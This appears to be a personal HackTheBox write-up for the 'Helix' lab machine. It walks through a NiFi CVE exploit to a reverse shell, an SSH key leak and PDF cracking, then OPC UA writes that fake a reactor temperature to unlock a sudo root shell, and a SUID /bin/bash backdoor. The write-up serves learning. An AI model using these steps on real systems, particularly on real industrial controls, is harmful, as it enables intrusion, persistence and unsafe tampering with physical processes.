# HTB - Helix

---
## General Info

- OS: Linux
- Open ports: 22, 80
- Internal/localhost ports (discovered post-shell): 4840 (OPC UA), 8080 (NiFi backend), 8081 (HMI), 35409, 39969
- Running services: OpenSSH 8.9p1, Nginx 1.18.0, Apache NiFi 1.21.0, Helix PLC (OPC UA), Helix HMI Dashboard, Helix Safety Controller
- Endpoints: too many to even enumerate
- VHosts: flow.helix.htb
- Auth: lol (anonymous OPC UA, SSH key just sitting in a public path)
- Pwnd date: 13/05/2026

---

## Enumeration

- After running basic enumeration (nmap, fuzzing and vhost fuzzing), I went to the main page in port 80 and found basically nothing. But I had found a vhost, and after adding it to `/etc/hosts`, I found a webpanel running NiFi (V1.21.0), which had a known [[CVE-2023-34468]], which can lead to RCE, and ultimately, to a Reverse Shell. Trying that.

---

## Exploitation

- Yup. After trying the [[CVE-2023-34468#PoC|PoC]], I got a reverse shell as user nifi. I upgraded the reverse shell [[Reverse Shell#Upgrade shell|RSUS]].
- Ok so, the home user is operator, which means I have to pivot to that user.
- I don't even know what to say. I just spent 3H down a cryptographic rabbit hole, thinking that decrypting the keys of NiFi were the way to get to operator. I thought that I had seen operator:(some hash). Well. I didn't. And this was the most time wasting thing in my life.
- After searching a writeup, I found this file: `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak`. A private key to SSH into the user operator. Fuck all my life decisions.
- Got user flag and started PrivEsc.

---

## PrivEsc

- I-. I don't even know what I'm looking at. I got inside the user folder, got the user flag, and found two files. One of them, a PDF that's encrypted. The other, an image about a network of a nuclear reactor or something like that. I will take a break now.

> Took a 4-day break here actually. Came back with a fresh brain. 10/10 would recommend stepping away from a box that's mentally cooking you.

- Okay so the image: it's a diagram of an **OPC UA server** running on `opc.tcp://127.0.0.1:4840/helix/`. OPC UA is an industrial control system (ICS) protocol used in real factories/power plants. It exposes a **tree of variables** (nodes) that clients can read/write. The diagram shows three groups: Reactor, Control, Safety. Some nodes writable, some read-only.
- Since the OPC UA server is bound to localhost, I need to port forward it out to my attacker box to comfortably poke at it:

```bash
ssh -i my_data/Machines/Helix/privkey.bak -L 4840:127.0.0.1:4840 operator@10.129.49.201
```

> Got the `-L` wrong on the first try. Mixed up which side was local vs remote. Note to self: `-L localport:remotehost:remoteport`. The remotehost is interpreted from the SSH server's perspective, which is why `127.0.0.1` works (it means "helix's own localhost").

- Installed `opcua` Python package (gives me CLI tools like `uadiscover`, `uals`, `uaread`, `uawrite`). See [[OPC UA]] notes for full reference.
- Started cracking the PDF in the background with john + rockyou. See [[Hash cracking#PDF]] for the workflow.

### OPC UA enumeration

- Ran discovery first:

```bash
uadiscover opc.tcp://localhost:4840
```

- Server is a `FreeOpcUa Python Server`. Security Mode: 1 (None). Accepts **anonymous**, username/password, and certificate auth. So I can connect with literally no creds. The classic "internal network, why bother" misconfig that's super common in real ICS environments.
- Browsed the address space from root → `Objects` → custom namespace `ns=2;Plant` → expanded into Reactor / Safety / Control.

```bash
uals -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=1" -l 4
```

- Final node map:

|Group|Node|NodeId|Type|Initial Value|
|---|---|---|---|---|
|Reactor|TemperatureRaw|ns=2;i=3|float|~283.9°C|
|Reactor|Temperature|ns=2;i=4|float|~283.9°C|
|Reactor|Pressure|ns=2;i=5|float|~68.9 bar|
|Reactor|CalibrationOffset|ns=2;i=6|float|0.0|
|Safety|RodsInserted|ns=2;i=8|bool|False|
|Safety|EmergencyCooling|ns=2;i=9|bool|False|
|Safety|TripActive|ns=2;i=10|bool|False|
|Control|Mode|ns=2;i=12|string|NORMAL|
|Control|TestOverride|ns=2;i=13|bool|False|
|Control|ResetTrip|ns=2;i=14|bool|False|

### PDF cracking pops

- About 5 minutes in, john cracked the PDF. The password was weak enough to be in rockyou despite the PDF using R6/AES-256 (which is normally slow as hell to crack). See [[Hash Cracking#PDF]] for command reference.
- The PDF is the **operator's manual** for the reactor system. The box just handed me the entire spec sheet. Key takeaways:
    - `Temperature` = `TemperatureRaw` + `CalibrationOffset` (i.e. the offset just fakes the temp reading)
    - Trip thresholds: Temp ≥ 305°C OR Pressure ≥ 75 bar
    - **Maintenance Window** opens when Temp ≈ 295°C OR Pressure ≈ 73 bar, AND no active trip
    - To enter maintenance: set `Mode → MAINTENANCE`, `TestOverride → True`, then ramp `CalibrationOffset` up slowly
    - "In maintenance window, certain diagnostic tools become available." 👀

### First write attempt (failed silently)

- Tried writing `CalibrationOffset = 5.0` directly. Worked! Temperature jumped to 289.5°C. Wrote `12.0` next to push into the window. Temperature dropped back to 283°C, offset back to 0.0, Mode reverted to NORMAL, TestOverride reverted to False.
- Took me a sec to realize: **there's a watchdog reverting my changes**. Confirmed by running `systemctl list-timers` — `helix-cleanup.timer` runs every 5 minutes and calls `helix-cleanup.service`, which presumably resets state to safe defaults.

### System recon (finding the watchdog and the privesc path)

```bash
systemctl list-timers --all
systemctl cat helix-cleanup.service
systemctl cat helix-plc.service
systemctl cat helix-safety.service
systemctl cat helix-hmi.service
sudo -l
```

- Service inventory:
    - `helix-plc.service` → runs `/opt/helix/bin/helix-plc` as `plc` (the OPC UA server)
    - `helix-safety.service` → runs `/opt/helix/bin/helix-safety` as **root** ← spicy
    - `helix-hmi.service` → runs `/opt/helix/bin/helix-hmi` as `www-data` (port 8080 — wait no that's NiFi lol, HMI's on a different port)
    - `helix-cleanup.service` → runs `/usr/local/sbin/helix-cleanup.sh` (oneshot, root, every 5min)
- `/opt/helix/` is `750 root:helixsvc`. I'm not in that group. Can't read any of the helix code.
- `/usr/local/sbin/helix-cleanup.sh` is `750 root:root`. Can't read it either.
- BUT `sudo -l` gave me the gold:

```
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

### Reading the maint-console script

- This one is `750 root:operator` — I'm not in helixsvc but I AM the `operator` group's owner via primary uid. So I can read it:

```bash
cat /usr/local/sbin/helix-maint-console
```

```bash
#!/bin/bash
set -euo pipefail
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi
# ...
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group \
  /bin/bash -p -i
```

- THE WHOLE PATH CLICKED. The script:
    1. Reads a timestamp from `/opt/helix/state/maintenance_window`
    2. If current time < timestamp → "window is open" → drops me into an **interactive root bash shell**
    3. Otherwise → "window closed, get out"
- I can't write to that flag file directly (perms). But `helix-safety` (which runs as root) presumably writes that timestamp **when the maintenance window conditions from the PDF are met**. So OPC UA is the way to trigger it indirectly.

### The exploit chain

1. Set the OPC UA values to enter the maintenance window (do it as a chained command so I beat the watchdog):

```bash
uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=12" -t string MAINTENANCE && \
uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=13" -t bool True && \
uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=6" -t double 12.0
```

> Important: `uawrite` types are CASE SENSITIVE LOWERCASE. `Double` errors out, `double` works. Same for `bool`, `string`, etc.

2. Verify Temperature ≥ 295°C, TripActive = False:

```bash
uaread -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=4"   # → 295.61
uaread -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=10"  # → False
```

3. In the SSH session, run the sudo script:

```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 109 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# whoami
root
```

4. Got root flag from `/root/root.txt`. Done.

### Persistence (because I only had a 2-minute root window)

- The root shell from `helix-maint-console` is time-limited by the maintenance window AND the watchdog will reset everything in 5 minutes anyway. So before the timer ran out:

```bash
chmod +s /bin/bash
```

- This sets the SUID bit on `/bin/bash`. Means any user who runs bash gets it running with the owner's effective UID — and bash is owned by root. So:

```bash
operator@helix:~$ /bin/bash -p
bash-5.1# whoami
root
```

- `/bin/bash -p` preserves the elevated privileges (without `-p`, bash drops them when run as SUID for "safety"). Now I have a permanent root shell I can pop any time, no need to dance around the watchdog.

---

## Rabbit holes

- Thought that keys I saw inside a .json file in NiFi were for the user operator. I saw `operator:` followed by something hash-looking written down. Maybe I just imagined it. Who knows. I should sleep more than 5H. Confirmation bias on a tired brain is real chat — once I committed to "crypto must be the path" I spent 3 hours trying to make every piece of evidence fit that narrative.
- Tried jumping the CalibrationOffset directly from 0 → 12 without setting Mode/TestOverride first. The PLC silently rejected it because per the PDF, in NORMAL mode all offsets are ignored. Have to do the writes in order.
- Initially panicked when offset got reset to 0 mid-experiment, thought I tripped the system. Was actually just the `helix-cleanup` watchdog doing its 5-minute reset. RTFM (read the systemd timers) saved me.

---

## Attack chain

- Recon → nmap → ports 22, 80 → vhost `flow.helix.htb`
- Identified Apache NiFi 1.21.0 on the vhost → exploited CVE-2023-34468 (RCE via Groovy script processor) → reverse shell as `nifi`
- Pivoted: found SSH private key at `/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak` → SSH'd in as `operator` → user flag
- Found OPC UA architecture diagram (PNG) and encrypted operator manual (PDF) in operator's home
- Port-forwarded localhost:4840 (OPC UA) to attacker box via SSH `-L`
- Cracked the PDF with `pdf2john` + john + rockyou (5 min, weak password)
- Enumerated OPC UA tree via anonymous auth (no creds needed, classic ICS misconfig)
- Used PDF spec to understand maintenance window mechanics
- Discovered `helix-cleanup.timer` resets system state every 5 min
- Found `sudo NOPASSWD` entry for `/usr/local/sbin/helix-maint-console`
- Read the script → it grants root shell when `/opt/helix/state/maintenance_window` contains a future timestamp
- Triggered the window via OPC UA writes (`Mode=MAINTENANCE`, `TestOverride=True`, `CalibrationOffset=12.0`) → pushed Temperature to ~295°C
- `helix-safety` (running as root) detected window conditions and wrote the timestamp file
- Ran `sudo helix-maint-console` → dropped into root shell
- Got root flag, set SUID bit on `/bin/bash` for persistence
- Permanent root via `/bin/bash -p` whenever needed

---

## Learnt

- **OPC UA / ICS basics**: It's a protocol used in real industrial environments (factories, power plants, water treatment). Servers expose a tree of nodes (variables); clients browse/read/write them. NodeIds look like `ns=2;i=5`. Common misconfigs: Security Mode "None" + anonymous auth allowed = full control with no creds. Default port 4840. CLI tools: `uadiscover`, `uals`, `uaread`, `uawrite`. See [[OPC UA]].
- **PDF password cracking**: Use `pdf2john` to extract a john-format hash, then crack with john or hashcat (mode 10500 for R3/R4, 10700 for R6/AES-256). R6 is slow as hell, so wordlist attacks only. See [[Hash Cracking#PDF]].
- **Reading sudo scripts before running them**: This whole privesc was solved by `cat`-ing the script and understanding its gate condition. Always read sudo binaries/scripts if they're readable.
- **The cost of confirmation bias on no sleep**: When tired, the brain hallucinates evidence to support whatever theory it's already attached to. Step away, sleep, come back.
- **Take breaks**: 4-day break before tackling OPC UA was the best decision of this entire box.

---

## Notes

- Machine rating: Hardish
- This machine was BRUTAL but genuinely fucking cool. First time touching ICS/OT protocols..
- The whole "you have to manipulate physical-process variables to unlock a software gate" mechanic is mad lol.